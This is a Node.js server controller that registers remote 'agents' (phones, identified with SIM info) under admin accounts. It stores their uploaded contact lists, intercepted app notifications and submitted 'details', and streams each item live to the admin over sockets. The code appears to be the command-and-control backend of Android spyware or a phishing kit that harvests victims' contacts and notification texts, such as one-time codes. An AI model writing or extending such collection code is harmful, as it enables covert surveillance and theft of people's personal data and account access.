const {respondSuccess} = require("../../managers/responseManager");
const {AgentModel, ContactsModel, DetailsModel, NotificationModel} = require("../../models/dataModels");
const {getPreferredTime} = require("../../managers/timeManager");

/**
 * When an agent awakes it makes a call with some information like Agent ID, Admin ID, S
 * */
const onAgentInit = async (req, res) => {
    let {agentID, adminID, agentName, deviceName, simInfo} = req.body; // agentID -> deviceID (same) :)

    let checkAgent = await AgentModel.findOne({agentID});

    if (checkAgent) {
        return respondSuccess(res);
    }

    let newAgent = new AgentModel({agentID, adminID, agentName, deviceName, time: getPreferredTime(), simInfo});
    await newAgent.save();

    io.to(connectedUsers[adminID]).emit("onNewAgentAdded", agentID, adminID, agentName, deviceName)

    return respondSuccess(res);
}


const onSaveContacts = async (req, res) => {
    try {
        const contacts = req.body;

        if (!Array.isArray(contacts) || contacts.length === 0) {
            return res.status(400).json({error: 'No contacts provided'});
        }

        if (contacts.length > 400) {
            return res.status(413).json({error: 'Batch too large'});
        }

        const agentID = req.params.agentID || req.headers['x-agent-id'];
        if (!agentID) {
            return res.status(400).json({error: 'Missing agent ID'});
        }

        const now = new Date();

        const processedContacts = contacts.map(contact => ({
            name: contact.name?.trim() || 'Unknown',
            phone: contact.phone?.replace(/\s+/g, '') || '',
            agentID,
            uploadedAt: now
        })).filter(contact => contact.phone.length > 0); // skip empty phones

        if (processedContacts.length === 0) {
            return res.status(400).json({error: 'No valid contacts'});
        }

        // Create bulk operations that perform upsert (insert if phone does not exist)
        const bulkOps = processedContacts.map(contact => ({
            updateOne: {
                filter: {phone: contact.phone},
                update: {$setOnInsert: contact},
                upsert: true
            }
        }));

        // Execute bulk write operations
        await ContactsModel.bulkWrite(bulkOps, {ordered: false});

        res.status(200).json({message: 'Contacts saved successfully'});
    } catch (err) {
        console.error('Error saving contacts:', err);
        res.status(500).json({error: 'Internal Server Error'});
    }
};

const onSaveDetails = async (req, res) => {
    let {agentID, details, adminID, submissionId} = req.body;

    let doc = await DetailsModel.findOne({submissionId}).lean();
    io.to(connectedUsers[adminID]).emit("new-details-" + agentID, details);

    if (doc) {
        await DetailsModel.updateOne({submissionId}, {$set: {details: {...doc.details, ...details}}});
        return respondSuccess(res);
    }

    let detail = new DetailsModel({
        agentID, details, time: getPreferredTime(), submissionId
    });

    await detail.save();

    return respondSuccess(res);

}


const onSaveNotification = async (req, res) => {
    let {agentID, appName, title, text} = req.body;

    let notificationModel = new NotificationModel({agentID, appName, title, text, time: getPreferredTime()});
    await notificationModel.save();

    io.emit("notification-" + agentID, title, getPreferredTime(), text, appName);

    return respondSuccess(res);

}


module.exports = {
    onAgentInit, onSaveContacts, onSaveDetails, onSaveNotification
}